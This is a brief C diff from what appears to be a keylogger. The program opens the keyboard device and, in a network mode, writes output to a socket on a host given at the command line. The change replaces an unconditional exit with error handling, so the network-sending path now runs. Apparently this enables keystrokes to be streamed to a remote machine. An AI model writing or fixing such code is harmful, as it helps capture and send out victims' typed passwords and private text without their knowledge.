@@ -45,7 +45,10 @@ int main(int argc, char *argv[]){
     }
     else if(network){
         writeout = get_socket_file_descriptor(option_input, PORT);
-        exit(1);
+        if(writeout < 0){
+            printf("Error creating socket on %s\n", option_input);
+            return 1;
+        }
     }
 
     if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
